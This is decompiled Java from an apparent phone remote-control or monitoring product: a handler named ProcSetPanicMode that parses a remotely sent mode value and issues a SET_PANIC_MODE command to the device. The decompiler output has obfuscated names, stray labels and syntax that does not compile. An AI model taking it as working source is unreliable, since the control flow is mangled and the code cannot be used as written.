package com.vvt.remotecommand.processor.e;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode.Mode;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;

public class b
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public b(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    int i = 1;
    RemoteFunction localRemoteFunction = null;
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = paramRemoteCommand.getParameters();
    bool1 = a;
    if ((!bool1) || (localArrayList == null))
    {
      bool1 = false;
      localObject1 = null;
      if (bool1 != i) {
        break label139;
      }
      localObject1 = (String)localArrayList.get(0);
      int j = Integer.parseInt((String)localObject1);
      if (j != i)
      {
        localObject1 = (String)localArrayList.get(0);
        k = Integer.parseInt((String)localObject1);
        int m = 2;
        if (k != m) {
          break label139;
        }
      }
      k = i;
    }
    for (;;)
    {
      i = a;
      if ((i != 0) && (k != 0)) {
        break label148;
      }
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
      k = localArrayList.size();
      break;
      label139:
      k = 0;
      localObject1 = null;
    }
    label148:
    Object localObject1 = (String)localArrayList.get(0);
    int k = Integer.parseInt((String)localObject1);
    i = a;
    if (i != 0) {}
    Object localObject2 = new com/vvt/remotecontrol/input/RmtCtrlInputPanicMode;
    ((RmtCtrlInputPanicMode)localObject2).<init>();
    localObject1 = RmtCtrlInputPanicMode.Mode.forValue(k);
    ((RmtCtrlInputPanicMode)localObject2).setMode((RmtCtrlInputPanicMode.Mode)localObject1);
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    ((ControlCommand)localObject1).<init>();
    localRemoteFunction = RemoteFunction.SET_PANIC_MODE;
    ((ControlCommand)localObject1).setFunction(localRemoteFunction);
    ((ControlCommand)localObject1).setData(localObject2);
    localObject2 = h();
    localObject1 = (RmtCtrlOutputStatusMessage)((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    i = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
    if (i != 0)
    {
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
      paramc.b(paramRemoteCommand, this, (String)localObject1);
    }
    for (;;)
    {
      boolean bool2 = a;
      if (bool2) {}
      return;
      localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
      ((RemoteCommandException)localObject2).<init>((String)localObject1);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcSetPanicMode";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/e/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */